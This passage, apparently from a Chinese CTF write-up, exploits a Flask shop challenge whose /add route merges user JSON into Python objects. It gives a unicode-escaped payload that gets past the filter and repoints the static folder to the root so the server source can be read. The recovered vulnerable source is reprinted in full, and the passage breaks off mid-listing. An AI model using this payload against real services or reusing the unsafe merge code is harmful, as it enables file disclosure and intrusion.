</span></span><span class="line"><span class="ln"> 20</span><span class="cl">        <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;橙c美式&#34;</span><span class="p">,</span> <span class="s2">&#34;price&#34;</span><span class="p">:</span> <span class="mf">19.99</span><span class="p">,</span> <span class="s2">&#34;image&#34;</span><span class="p">:</span> <span class="s2">&#34;2.png&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="ln"> 21</span><span class="cl">        <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;摩卡&#34;</span><span class="p">,</span> <span class="s2">&#34;price&#34;</span><span class="p">:</span> <span class="mf">29.99</span><span class="p">,</span> <span class="s2">&#34;image&#34;</span><span class="p">:</span> <span class="s2">&#34;3.png&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="ln"> 22</span><span class="cl">        <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;卡布奇诺&#34;</span><span class="p">,</span> <span class="s2">&#34;price&#34;</span><span class="p">:</span> <span class="mf">19.99</span><span class="p">,</span> <span class="s2">&#34;image&#34;</span><span class="p">:</span> <span class="s2">&#34;4.png&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="ln"> 23</span><span class="cl">        <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;冰拿铁&#34;</span><span class="p">,</span> <span class="s2">&#34;price&#34;</span><span class="p">:</span> <span class="mf">29.99</span><span class="p">,</span> <span class="s2">&#34;image&#34;</span><span class="p">:</span> <span class="s2">&#34;5.png&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 24</span><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="ln"> 25</span><span class="cl">
</span></span><span class="line"><span class="ln"> 26</span><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 27</span><span class="cl">                         <span class="n">error_message</span><span class="o">=</span><span class="n">error_message</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 28</span><span class="cl">                         <span class="n">session</span><span class="o">=</span><span class="n">session</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 29</span><span class="cl">                         <span class="n">products</span><span class="o">=</span><span class="n">products</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 30</span><span class="cl">
</span></span><span class="line"><span class="ln"> 31</span><span class="cl">
</span></span><span class="line"><span class="ln"> 32</span><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 33</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln"> 34</span><span class="cl">
</span></span><span class="line"><span class="ln"> 35</span><span class="cl">
</span></span><span class="line"><span class="ln"> 36</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/add&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln"> 37</span><span class="cl"><span class="k">def</span> <span class="nf">adddd</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 38</span><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 39</span><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="ln"> 40</span><span class="cl"><span class="s1">            &lt;html&gt;
</span></span></span><span class="line"><span class="ln"> 41</span><span class="cl"><span class="s1">                &lt;body style=&#34;background-image: url(&#39;/static/img/7.png&#39;); background-size: cover; background-repeat: no-repeat;&#34;&gt;
</span></span></span><span class="line"><span class="ln"> 42</span><span class="cl"><span class="s1">                    &lt;h2&gt;添加商品&lt;/h2&gt;
</span></span></span><span class="line"><span class="ln"> 43</span><span class="cl"><span class="s1">                    &lt;form id=&#34;productForm&#34;&gt;
</span></span></span><span class="line"><span class="ln"> 44</span><span class="cl"><span class="s1">                        &lt;p&gt;商品名称: &lt;input type=&#34;text&#34; id=&#34;name&#34;&gt;&lt;/p&gt;
</span></span></span><span class="line"><span class="ln"> 45</span><span class="cl"><span class="s1">                        &lt;p&gt;商品价格: &lt;input type=&#34;text&#34; id=&#34;price&#34;&gt;&lt;/p&gt;
</span></span></span><span class="line"><span class="ln"> 46</span><span class="cl"><span class="s1">                        &lt;button type=&#34;button&#34; onclick=&#34;submitForm()&#34;&gt;添加商品&lt;/button&gt;
</span></span></span><span class="line"><span class="ln"> 47</span><span class="cl"><span class="s1">                    &lt;/form&gt;
</span></span></span><span class="line"><span class="ln"> 48</span><span class="cl"><span class="s1">                    &lt;script&gt;
</span></span></span><span class="line"><span class="ln"> 49</span><span class="cl"><span class="s1">                        function submitForm() {
</span></span></span><span class="line"><span class="ln"> 50</span><span class="cl"><span class="s1">                            const nameInput = document.getElementById(&#39;name&#39;).value;
</span></span></span><span class="line"><span class="ln"> 51</span><span class="cl"><span class="s1">                            const priceInput = document.getElementById(&#39;price&#39;).value;
</span></span></span><span class="line"><span class="ln"> 52</span><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="ln"> 53</span><span class="cl"><span class="s1">                            fetch(`/add?price=${encodeURIComponent(priceInput)}`, {
</span></span></span><span class="line"><span class="ln"> 54</span><span class="cl"><span class="s1">                                method: &#39;POST&#39;,
</span></span></span><span class="line"><span class="ln"> 55</span><span class="cl"><span class="s1">                                headers: {
</span></span></span><span class="line"><span class="ln"> 56</span><span class="cl"><span class="s1">                                    &#39;Content-Type&#39;: &#39;application/json&#39;,
</span></span></span><span class="line"><span class="ln"> 57</span><span class="cl"><span class="s1">                                },
</span></span></span><span class="line"><span class="ln"> 58</span><span class="cl"><span class="s1">                                body: nameInput
</span></span></span><span class="line"><span class="ln"> 59</span><span class="cl"><span class="s1">                            })
</span></span></span><span class="line"><span class="ln"> 60</span><span class="cl"><span class="s1">                            .then(response =&gt; response.text())
</span></span></span><span class="line"><span class="ln"> 61</span><span class="cl"><span class="s1">                            .then(data =&gt; alert(data))
</span></span></span><span class="line"><span class="ln"> 62</span><span class="cl"><span class="s1">                            .catch(error =&gt; console.error(&#39;错误:&#39;, error));
</span></span></span><span class="line"><span class="ln"> 63</span><span class="cl"><span class="s1">                        }
</span></span></span><span class="line"><span class="ln"> 64</span><span class="cl"><span class="s1">                    &lt;/script&gt;
</span></span></span><span class="line"><span class="ln"> 65</span><span class="cl"><span class="s1">                &lt;/body&gt;
</span></span></span><span class="line"><span class="ln"> 66</span><span class="cl"><span class="s1">            &lt;/html&gt;
</span></span></span><span class="line"><span class="ln"> 67</span><span class="cl"><span class="s1">        &#39;&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 68</span><span class="cl">    <span class="k">elif</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 69</span><span class="cl">        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 70</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 71</span><span class="cl">                <span class="n">raw_data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 72</span><span class="cl">                <span class="k">if</span> <span class="n">check</span><span class="p">(</span><span class="n">raw_data</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 73</span><span class="cl">                <span class="c1">#检测添加的商品是否合法</span>
</span></span><span class="line"><span class="ln"> 74</span><span class="cl">                    <span class="k">return</span> <span class="s2">&#34;该商品违规，无法上传&#34;</span>
</span></span><span class="line"><span class="ln"> 75</span><span class="cl">                <span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">raw_data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 76</span><span class="cl">
</span></span><span class="line"><span class="ln"> 77</span><span class="cl">                <span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">json_data</span><span class="p">,</span> <span class="nb">dict</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 78</span><span class="cl">                    <span class="k">return</span> <span class="s2">&#34;添加失败1&#34;</span>
</span></span><span class="line"><span class="ln"> 79</span><span class="cl">
</span></span><span class="line"><span class="ln"> 80</span><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">json_data</span><span class="p">,</span> <span class="n">add</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 81</span><span class="cl">                <span class="k">return</span> <span class="s2">&#34;你无法添加商品哦&#34;</span>
</span></span><span class="line"><span class="ln"> 82</span><span class="cl">
</span></span><span class="line"><span class="ln"> 83</span><span class="cl">            <span class="k">except</span> <span class="p">(</span><span class="ne">UnicodeDecodeError</span><span class="p">,</span> <span class="n">json</span><span class="o">.</span><span class="n">JSONDecodeError</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 84</span><span class="cl">                <span class="k">return</span> <span class="s2">&#34;添加失败2&#34;</span>
</span></span><span class="line"><span class="ln"> 85</span><span class="cl">            <span class="k">except</span> <span class="ne">TypeError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 86</span><span class="cl">                <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;添加失败3&#34;</span>
</span></span><span class="line"><span class="ln"> 87</span><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 88</span><span class="cl">                <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;添加失败4&#34;</span>
</span></span><span class="line"><span class="ln"> 89</span><span class="cl">        <span class="k">return</span> <span class="s2">&#34;添加失败5&#34;</span>
</span></span><span class="line"><span class="ln"> 90</span><span class="cl">
</span></span><span class="line"><span class="ln"> 91</span><span class="cl">
</span></span><span class="line"><span class="ln"> 92</span><span class="cl">
</span></span><span class="line"><span class="ln"> 93</span><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 94</span><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 95</span><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 96</span><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 97</span><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 98</span><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 99</span><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="ln">100</span><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">101</span><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">102</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">103</span><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">104</span><span class="cl">
</span></span><span class="line"><span class="ln">105</span><span class="cl">
</span></span><span class="line"><span class="ln">106</span><span class="cl">
</span></span><span class="line"><span class="ln">107</span><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">5014</span><span class="p">)</span>
</span></span></code></pre></div><p>/add路由存在原型链污染</p>
<p>远端应该是有waf的，但是给出的源码没给出来</p>
<pre tabindex="0"><code>if check(raw_data):
#检测添加的商品是否合法
</code></pre><p>waf比较简单，直接unicode编码绕过即可</p>
<p>先污染静态目录拿一手远端源码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="n">POST</span> <span class="o">/</span><span class="n">add</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="mf">27.25.151.198</span><span class="p">:</span><span class="mi">30362</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Dest</span><span class="p">:</span> <span class="n">empty</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Mode</span><span class="p">:</span> <span class="n">cors</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="p">:</span> <span class="s2">&#34;Google Chrome&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s2">&#34;137&#34;</span><span class="p">,</span> <span class="s2">&#34;Chromium&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s2">&#34;137&#34;</span><span class="p">,</span> <span class="s2">&#34;Not/A)Brand&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s2">&#34;24&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">Referer</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">27.25.151.198</span><span class="p">:</span><span class="mi">30362</span><span class="o">/</span><span class="n">add</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span><span class="p">,</span> <span class="n">br</span><span class="p">,</span> <span class="n">zstd</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">platform</span><span class="p">:</span> <span class="s2">&#34;Windows&#34;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">Origin</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">27.25.151.198</span><span class="p">:</span><span class="mi">30362</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Site</span><span class="p">:</span> <span class="n">same</span><span class="o">-</span><span class="n">origin</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Windows</span> <span class="n">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="n">Win64</span><span class="p">;</span> <span class="n">x64</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mf">137.0.0.0</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">mobile</span><span class="p">:</span> <span class="err">?</span><span class="mi">0</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">3</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">{</span><span class="s2">&#34;</span><span class="se">\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F</span><span class="s2">&#34;</span><span class="p">:{</span><span class="s2">&#34;</span><span class="se">\u0061\u0070\u0070</span><span class="s2">&#34;</span><span class="p">:{</span><span class="s2">&#34;</span><span class="se">\u0073\u0074\u0061\u0074\u0069\u0063\u005F\u0066\u006F\u006C\u0064\u0065\u0072</span><span class="s2">&#34;</span><span class="p">:</span><span class="s2">&#34;</span><span class="se">\u002F</span><span class="s2">&#34;</span><span class="p">}}}</span>
</span></span></code></pre></div><p>访问/static/app.py即可拿到完整源码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">  1</span><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">render_template</span>
</span></span><span class="line"><span class="ln">  2</span><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="ln">  4</span><span class="cl">
</span></span><span class="line"><span class="ln">  5</span><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">  6</span><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">  7</span><span class="cl">
</span></span><span class="line"><span class="ln">  8</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="k">def</span> <span class="nf">store</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 10</span><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 11</span><span class="cl">        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&#34;customer&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 12</span><span class="cl">        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;permission&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 13</span><span class="cl">
</span></span><span class="line"><span class="ln"> 14</span><span class="cl">    <span class="n">error_message</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 15</span><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 16</span><span class="cl">        <span class="n">error_message</span> <span class="o">=</span> <span class="s1">&#39;&lt;p style=&#34;color: red; font-size: 0.8em;&#34;&gt;该商品暂时无法购买，请稍后再试！&lt;/p&gt;&#39;</span>
</span></span><span class="line"><span class="ln"> 17</span><span class="cl">
</span></span><span class="line"><span class="ln"> 18</span><span class="cl">    <span class="n">products</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="ln"> 19</span><span class="cl">        <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;美式咖啡&#34;</span><span class="p">,</span> <span class="s2">&#34;price&#34;</span><span class="p">:</span> <span class="mf">9.99</span><span class="p">,</span> <span class="s2">&#34;image&#34;</span><span class="p">:</span> <span class="s2">&#34;1.png&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="ln"> 20</span><span class="cl">        <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;橙c美式&#34;</span><span class="p">,</span> <span class="s2">&#34;price&#34;</span><span class="p">:</span> <span class="mf">19.99</span><span class="p">,</span> <span class="s2">&#34;image&#34;</span><span class="p">:</span> <span class="s2">&#34;2.png&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="ln"> 21</span><span class="cl">        <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;摩卡&#34;</span><span class="p">,</span> <span class="s2">&#34;price&#34;</span><span class="p">:</span> <span class="mf">29.99</span><span class="p">,</span> <span class="s2">&#34;image&#34;</span><span class="p">:</span> <span class="s2">&#34;3.png&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="ln"> 22</span><span class="cl">        <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;卡布奇诺&#34;</span><span class="p">,</span> <span class="s2">&#34;price&#34;</span><span class="p">:</span> <span class="mf">19.99</span><span class="p">,</span> <span class="s2">&#34;image&#34;</span><span class="p">:</span> <span class="s2">&#34;4.png&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="ln"> 23</span><span class="cl">        <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;冰拿铁&#34;</span><span class="p">,</span> <span class="s2">&#34;price&#34;</span><span class="p">:</span> <span class="mf">29.99</span><span class="p">,</span> <span class="s2">&#34;image&#34;</span><span class="p">:</span> <span class="s2">&#34;5.png&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 24</span><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="ln"> 25</span><span class="cl">
</span></span><span class="line"><span class="ln"> 26</span><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 27</span><span class="cl">                         <span class="n">error_message</span><span class="o">=</span><span class="n">error_message</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 28</span><span class="cl">                         <span class="n">session</span><span class="o">=</span><span class="n">session</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 29</span><span class="cl">                         <span class="n">products</span><span class="o">=</span><span class="n">products</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 30</span><span class="cl">
</span></span><span class="line"><span class="ln"> 31</span><span class="cl">
</span></span><span class="line"><span class="ln"> 32</span><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 33</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln"> 34</span><span class="cl">
</span></span><span class="line"><span class="ln"> 35</span><span class="cl">
</span></span><span class="line"><span class="ln"> 36</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/add&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln"> 37</span><span class="cl"><span class="k">def</span> <span class="nf">adddd</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 38</span><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 39</span><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="ln"> 40</span><span class="cl"><span class="s1">            &lt;html&gt;
</span></span></span><span class="line"><span class="ln"> 41</span><span class="cl"><span class="s1">                &lt;body style=&#34;background-image: url(&#39;/static/img/7.png&#39;); background-size: cover; background-repeat: no-repeat;&#34;&gt;
</span></span></span><span class="line"><span class="ln"> 42</span><span class="cl"><span class="s1">                    &lt;h2&gt;添加商品&lt;/h2&gt;
</span></span></span><span class="line"><span class="ln"> 43</span><span class="cl"><span class="s1">                    &lt;form id=&#34;productForm&#34;&gt;
</span></span></span><span class="line"><span class="ln"> 44</span><span class="cl"><span class="s1">                        &lt;p&gt;商品名称: &lt;input type=&#34;text&#34; id=&#34;name&#34;&gt;&lt;/p&gt;
</span></span></span><span class="line"><span class="ln"> 45</span><span class="cl"><span class="s1">                        &lt;p&gt;商品价格: &lt;input type=&#34;text&#34; id=&#34;price&#34;&gt;&lt;/p&gt;
</span></span></span><span class="line"><span class="ln"> 46</span><span class="cl"><span class="s1">                        &lt;button type=&#34;button&#34; onclick=&#34;submitForm()&#34;&gt;添加商品&lt;/button&gt;
</span></span></span><span class="line"><span class="ln"> 47</span><span class="cl"><span class="s1">                    &lt;/form&gt;
</span></span></span><span class="line"><span class="ln"> 48</span><span class="cl"><span class="s1">                    &lt;script&gt;
</span></span></span><span class="line"><span class="ln"> 49</span><span class="cl"><span class="s1">                        function submitForm() {
</span></span></span><span class="line"><span class="ln"> 50</span><span class="cl"><span class="s1">                            const nameInput = document.getElementById(&#39;name&#39;).value;
</span></span></span><span class="line"><span class="ln"> 51</span><span class="cl"><span class="s1">                            const priceInput = document.getElementById(&#39;price&#39;).value;
</span></span></span><span class="line"><span class="ln"> 52</span><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="ln"> 53</span><span class="cl"><span class="s1">                            fetch(`/add?price=${encodeURIComponent(priceInput)}`, {
</span></span></span><span class="line"><span class="ln"> 54</span><span class="cl"><span class="s1">                                method: &#39;POST&#39;,
</span></span></span><span class="line"><span class="ln"> 55</span><span class="cl"><span class="s1">                                headers: {
</span></span></span><span class="line"><span class="ln"> 56</span><span class="cl"><span class="s1">                                    &#39;Content-Type&#39;: &#39;application/json&#39;,
</span></span></span><span class="line"><span class="ln"> 57</span><span class="cl"><span class="s1">                                },
</span></span></span><span class="line"><span class="ln"> 58</span><span class="cl"><span class="s1">                                body: nameInput
</span></span></span><span class="line"><span class="ln"> 59</span><span class="cl"><span class="s1">                            })
</span></span></span><span class="line"><span class="ln"> 60</span><span class="cl"><span class="s1">                            .then(response =&gt; response.text())
